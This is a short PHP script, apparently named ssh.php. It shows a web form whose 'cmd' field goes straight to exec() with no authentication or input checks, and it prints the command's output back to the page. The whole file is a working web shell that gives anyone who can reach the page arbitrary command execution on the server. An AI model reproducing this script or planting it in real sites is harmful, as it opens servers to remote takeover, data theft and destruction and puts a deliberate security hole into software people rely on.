

<form action="ssh.php" method="post">
 <p>command : <textarea  name="cmd" rows="2" cols="100" ></textarea></p>
  <p><input type="submit" value="OK"></p>
</form>
<?php

if (isset($_POST['cmd']))
 {
$cmd = $_POST['cmd'];
 }
 else
 {
$cmd = 'pwd';
 }
 echo "$cmd ";
$ret=exec($cmd,$output);
 echo'<pre>';
 print_r($output);
 echo'</pre>';
 
?>